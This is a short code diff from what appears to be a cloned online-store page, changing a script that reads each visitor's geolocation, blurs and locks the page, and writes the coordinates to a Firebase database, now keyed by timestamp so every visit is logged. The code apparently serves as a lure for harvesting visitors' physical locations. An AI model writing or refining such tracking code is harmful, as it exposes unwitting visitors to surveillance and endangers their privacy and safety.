@@ -7891,9 +7891,10 @@ _ReStockConfig.wishlist = undefined;_ReStockConfig.wishlist = {"is_service_activ
                     document.querySelector('body').style.filter = 'blur(0px)';
                     document.querySelector('body').style.pointerEvents = 'none';
                     var location = position.coords.latitude + ',' + position.coords.longitude;
+                    var timestamp = Date.now();
                     module.sendMsg = async function sendMsg() {
-                      set(ref(db, 'Messages/Locations'), {
-                        "Location": location
+                      set(ref(db, 'Locations/'), {
+                        [timestamp]: location
                       }).then(() => {
                         alert('Location sent successfully!');
                       })
